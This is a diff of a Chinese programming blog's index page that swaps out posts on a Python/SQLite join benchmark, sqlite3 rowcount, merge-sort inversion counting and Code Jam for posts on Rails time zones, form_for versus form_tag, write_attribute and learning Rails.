+</span><span class='line'><span class="n">config</span><span class="o">.</span><span class="n">time_zone</span> <span class="o">=</span> <span class="s1">&#39;Beijing&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
-def insertProgress(conn, user_id):
-cur = conn.execute('INSERT INTO todo(title, date) VALUES(?,?)', ['just test!!!', time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())])
-conn.execute('INSERT INTO todo_meta(todo_id, user_id) VALUES(?,?)', [cur.lastrowid, user_id])
+<p>为何我说差不多呢，原因如下：</p>
 
+<p><code>``ruby
+irb(main):001:0&gt; Fpwd.store(1)
+ Fpwd Load (0.2ms)  SELECT "fpwds".* FROM "fpwds" WHERE "fpwds"."user_id" = 1 LIMIT 1
+ SQL (2.7ms)  DELETE FROM "fpwds" WHERE "fpwds"."user_id" = 1
+  (0.1ms)  begin transaction
+Binary data inserted for</code>string<code>type on column</code>randstring`
+ SQL (429.6ms)  INSERT INTO &ldquo;fpwds&rdquo; (&ldquo;created_at&rdquo;, &ldquo;randstring&rdquo;, &ldquo;updated_at&rdquo;, &ldquo;user_id&rdquo;) VALUES (?, ?, ?, ?)  [[&ldquo;created_at&rdquo;, Wed, 15 Feb 2012 14:29:35 CST +08:00], [&ldquo;randstring&rdquo;, &ldquo;87e685e0d2ab37143fae248083822ffea600f577&rdquo;], [&ldquo;updated_at&rdquo;, Wed, 15 Feb 2012 14:29:35 CST +08:00], [&ldquo;user_id&rdquo;, 1]]
+  (1.4ms)  commit transaction
+=<Fpwd user_id: 1, randstring: "87e685e0d2ab37143fae248083822ffea600f577", created_at: "2012-02-15 06:29:35", updated_at: "2012-02-15 06:29:35"></p>
 
-def insertManyData(conn):
-#reset database
-os.system('sqlite3 test.db &lt; schema.sql')
-
-conn.cursor()
-counts = [0,0,0,0,0,0]
-for i in xrange(100000):
-userid = random.choice([0, 1, 2, 3, 4, 5])
-counts[userid] += 1
-insertProgress(conn, userid)
-conn.commit()
-conn.close()
-print counts
-
-def selectUsingLeftOuterJoin(conn, user_id):
-conn.cursor()
-cur = conn.execute('SELECT t.title, t.date \
-FROM todo t LEFT OUTER JOIN todo_meta tm \
-ON tm.todo_id = t.id\WHERE tm.user_id = ?', [user_id])
-def selectTwoTimes(conn, user_id):
-conn.cursor()
-cur = conn.execute('SELECT todo_id FROM todo_meta WHERE user_id = ?', [user_id])
-for tid in [row[0] for row in cur.fetchall()]:
-cur = conn.execute('SELECT title, date FROM todo WHERE id = ?', [tid])
-
-if __name__ == "__main__":
-uids = [0, 1, 2, 3, 4, 5]
-insert_time_start = time.time()
-insertManyData(connect())
-print "Insert Time: %f" % (time.time() - insert_time_start)
-select_ULOJ_start = time.time()
-for uid in uids:
-selectUsingLeftOuterJoin(connect(), uid)
-print "Select Using Left Outer Join time: %f" % (time.time() - select_ULOJ_start)
-select_two_times = time.time()
-for uid in uids:
-selectTwoTimes(connect(), uid)
-print "Select Two Times time: %f" % (time.time() - select_two_times)</pre>
-
-
-<p>schema：</p>
-
-<pre class="prettyprint linenums bush:sql" lang="sql">drop table if exists todo;
-drop table if exists user;
-drop table if exists todo_meta;
-create table todo (
-id integer primary key autoincrement,
-title string not null,
-date datetime not null
-);
-create table user (
-id integer primary key autoincrement,
-email string not null,
-password string not null,
-nickname string not null,
-salt string not null
-);
-create table todo_meta (
-todo_id integer,
-user_id integer,
-foreign key(todo_id) references todo(id),
-foreign key(user_id) references user(id)
-);</pre>
-
-
-<p>启动脚本就会创建数据库并开始测试。</p>
+<p>最后的返回值那里还是晚了8小时，我用sqlite3查看的时候时间是正常的，所以这里怀疑是ruby的时间问题了，好在app中已经正常！</p>
 
 		
 		
@@ -528,11 +940,11 @@ foreign key(user_id) references user(id)
   
 
 
-<time datetime="2012-05-14T23:23:00+08:00" pubdate data-updated="true">May 14<span>th</span>, 2012</time></div>
+<time datetime="2012-02-15T14:37:00+08:00" pubdate data-updated="true">Feb 15<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/sqlite/'>sqlite</a>, <a class='category' href='/blog/categories/xing-neng/'>性能</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/ror/'>ror</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
@@ -544,18 +956,16 @@ foreign key(user_id) references user(id)
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/14/the-rowcount-of-cursor-in-sqlite3/">
+		<a href="/blog/2012/02/14/differentiate-form-for-and-form-tag/">
 		
-			Sqlite3的rowcount</a>
+			分清form_for和form_tag</a>
 	</h2>
 	<div class="entry-content">
-		<p>最近写了一个todo的webapp，在用户登陆的时候是select数据库中的内容进行对比判断，当然如果select的内容是0那就表示用户登陆失败了，可能账号或者密码写错了，数据库用的sqlite3，在python的api中发现有cursor.rowcount可用，于是就这么判断一下是不是有数据被select出来了，没想到这样判断是错误的。</p>
+		<p>两个都是做form的指令，form_for是用来和一个model一块用的时候使用，form_tag就是普通的form了，侧重传值什么的。当初用了form_for来做了个登陆界面，怎么都得不到username和password，原来是这样，必须如此引用才可以——params[:user][:username]，前面的:user是我给form_for的第一个参数，这个form的所有信息都得加[:user]这样的前缀才能得到了，让我十分痛苦（又加上是个2.14）</p>
 
-<p>select的rowcount永远为-1，哎，这里着实坑了我一番啊～</p>
+<p>使用form_tag后对于它的action不太会控制，所幸不写参数了，正好action指向本地址，省事儿！</p>
 
-<p>只好cursor.fetchone()先，然后判断得到的内容是不是None。</p>
-
-<p>从<a href="http://stackoverflow.com/questions/839069/cursor-rowcount-always-1-in-sqlite3-in-python3k" target="_blank">这里</a>得到的答案。</p>
+<p>感谢<a href="http://blog.csdn.net/babylon_0049/article/details/4730763">这里</a>写的内容</p>
 
 		
 		
@@ -575,11 +985,11 @@ foreign key(user_id) references user(id)
   
 
 
-<time datetime="2012-05-14T17:00:00+08:00" pubdate data-updated="true">May 14<span>th</span>, 2012</time></div>
+<time datetime="2012-02-14T19:34:00+08:00" pubdate data-updated="true">Feb 14<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/flask/'>flask</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/sqlite/'>sqlite</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/ror/'>ror</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
@@ -591,70 +1001,38 @@ foreign key(user_id) references user(id)
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/07/solve-inversion-by-using-merge/">
+		<a href="/blog/2012/02/14/write-attribute-in-ruby/">
 		
-			逆序对的求解</a>
+			Ruby中的write_attribute</a>
 	</h2>
 	<div class="entry-content">
-		<p>今天看到算法导论上关于求解一个序列的逆序对的问题，以前自己在这个地方写着解答方法，不过今天怎么看都不懂了，从网上找了找，大都说得很模糊，不过自己突然有种领悟了的感觉，找了个简单的例子，实验了一下，自己的结论是正确的：）</p>
+		<p>有时候想修改一下自己的setter方法，于是会容易犯这样的一个错误：</p>
 
-<p>例子是（2，3，8，6，1）这个序列，找出所有的5个逆序对。最好的方法是nlogn复杂度的利用归并排序的副产品——merge部分统计，统计比较左右列表时，左侧大于右侧时“左侧”列表中剩余数目。</p>
-
-<p>归并的划分应该是这样的，（2，3，8）为左侧，（6，1）为右侧，继续划分为（2，3）和8，右边是6和1。下面就开始合并了，（2，3）和8这边还是（2，3，8），右侧出现一个逆序对，在合并6，1的时候因为作为“左侧”的6要大于1，所以这里有1个逆序对，这里的1就是此时“左侧”序列中的元素个数。</p>
-
-<p>在往下走，要合并（2，3，8）和（1，6），马上就出现了2&gt;1这样的情况，此时会出现（2，1）、（3，1）、（8，1）这几个逆序对，后面还会出现（8，6）这个逆序对，一共就这么5个。</p>
-
-<p>因为原始序列是（2，3，8，6，1），我们需要用到这个原始序列的顺序来判断顺序排在前面的值却大于后面的，这样的机会在每次merge的时候是非常合适的。</p>
-
-<p>这是修改后输出逆序对的归并排序算法，有点可惜哈，这么长的排序算法只让副产品在台前显露了一把！</p>
-
-<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
-# coding: utf-8
-
-def merge(arraylist, first, middle, last):
-   temp = []
-   i = first
-   j = middle + 1
-   while i &lt;= middle and j &lt;= last:
-       if arraylist[i] &lt;= arraylist[j]:
-           temp.append(arraylist[i])
-           i += 1
-       else:
-           for x in arraylist[i:middle + 1]:
-               print "(%d,%d)" % (x, arraylist[j])
-           temp.append(arraylist[j])
-           j += 1
-   while i &lt;= middle:
-       temp.append(arraylist[i])
-       i += 1
-   while j &lt;= last:
-       temp.append(arraylist[j])
-       j += 1
-   for i in range(0, last - first + 1):
-       arraylist[first + i] = temp[i]
-
-def merge_sort(arraylist, first, last):
-   if first &lt; last:
-       middle = (first + last) / 2
-       merge_sort(arraylist, first, middle)
-       merge_sort(arraylist, middle + 1, last)
-       merge(arraylist, first, middle, last)
-
-if __name__ == "__main__":
-lst = [2,3,8,6,1]
-merge_sort(lst, 0, len(lst) - 1)</pre>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">password</span><span class="o">=</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
+</span><span class='line'>   <span class="vi">@password</span> <span class="o">=</span> <span class="n">pwd</span>
+</span><span class='line'>   <span class="k">return</span> <span class="k">if</span> <span class="vi">@password</span><span class="o">.</span><span class="n">blank?</span>
+</span><span class='line'>   <span class="n">create_new_salt</span>
+</span><span class='line'>   <span class="nb">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">xxx</span>
+</span><span class='line'> <span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
-<p>运行结果：</p>
+<p>ruby</p>
 
-<pre class="prettyprint linenums bush:bash" lang="bash">(6,1)
-(2,1)
-(3,1)
-(8,1)
-(8,6)</pre>
+<p>最后那行使用了self.password= xxx，你有没有注意到我们这个方法就是password=，你在自己调用自己，如果有条件停止的话，那这叫递归，如果没有的话，这就是死循环喽，ruby可能会抛出一个stack too deep的错误（rails至少会这样说），此时需要一个magic！</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">write_attribute</span><span class="p">(</span><span class="ss">:password</span><span class="p">,</span> <span class="no">User</span><span class="o">.</span><span class="n">encrypted_password</span><span class="p">(</span><span class="nb">self</span><span class="o">.</span><span class="n">password</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">salt</span><span class="p">))</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
-<p>（我的代码缩进似乎出了点问题，本身这段归并排序也是从网上找来的，所以混合了不少tab和whitespace，弄了好久都是error indent，最后我无奈用whitespace来做缩进，好歹调试通过了！）</p>
+<p>使用write_attribute(xxx,jjj)即可，意思就是把jjj赋值给xxx了，因为此时正好在定义xxx，所以不能用xxx = 这样的方法赋值。</p>
 
 		
 		
@@ -674,11 +1052,11 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
   
 
 
-<time datetime="2012-05-07T17:08:00+08:00" pubdate data-updated="true">May 7<span>th</span>, 2012</time></div>
+<time datetime="2012-02-14T16:06:00+08:00" pubdate data-updated="true">Feb 14<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/gui-bing-pai-xu/'>归并排序</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>, <a class='category' href='/blog/categories/ni-xu-dui/'>逆序对</a>
+	<a class='category' href='/blog/categories/ruby/'>ruby</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
@@ -690,18 +1068,16 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2012/05/06/miserable-code-jam-2012/">
+		<a href="/blog/2012/02/12/pain-rails/">
 		
-			悲惨的CodeJam2012</a>
+			痛苦的rails</a>
 	</h2>
 	<div class="entry-content">
-		<p>资格赛晋级之后还稍稍得到了点自信，起码原来只能远观CodeJam的我现在也能继续走进看看了，不过家下来的Round1三场比赛直接被虐杀了，每一场都是最后，每个题都做不出来，说出来也是很惭愧的，但得承认自己这点能力，有人不到5分钟就能做对一个大题，而我5分钟可能都没读完题，更别说写代码了。</p>
+		<p>由于rails给我带来的痛苦，让我对ruby这门写着code for fun的语言产生了怀疑，真得有fun么？一开始就没有感觉，现在来看更是如此。</p>
 
-<p>但最重要的是理解题目，能够理解了也就完成了90%，剩下的工作就是coding的过程，参加比赛的人基本都是有备而来，各种模版、脚本都准备好了，写起来非常快。对于非英语系国家的选手来说，读题似乎是很大的障碍，起码会比别人慢好多倍，这点只能多多看英文的资料来弥补了！</p>
+<p>rails是一个正在成长的框架，每一个小版本号的变动都可能会引入和废弃不少特性，而我又傻傻地在使用最新的rails（3.2.1），书上讲的都是rails2.2.2的内容，乍一看变动不应该太大啊，实际上并不是如此！！！</p>
 
-<p>今天的Round1第三场出现了两个动态规划的题，感觉知道了怎么做可就是不会写，我也就是停留在知道有动态规划这种变态方法的层面上，真让我写出来可不行，抱着《算法导论》看了半天也是毫无头绪……</p>
-
-<p>毕竟不是Acmer，咱也就只能止步于此啦！希望进入下一轮的国人们继续加油！</p>
+<p>对于一个新手来说，学习一个正在成长的框架是痛苦的：（</p>
 
 		
 		
@@ -721,11 +1097,11 @@ merge_sort(lst, 0, len(lst) - 1)</pre>
   
 
 
-<time datetime="2012-05-06T21:49:00+08:00" pubdate data-updated="true">May 6<span>th</span>, 2012</time></div>
+<time datetime="2012-02-12T22:03:00+08:00" pubdate data-updated="true">Feb 12<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/code-jam/'>Code jam</a>, <a class='category' href='/blog/categories/zhe-si/'>哲思</a>
+	<a class='category' href='/blog/categories/ror/'>ror</a>, <a class='category' href='/blog/categories/study/'>study</a>
 
 
 </div>
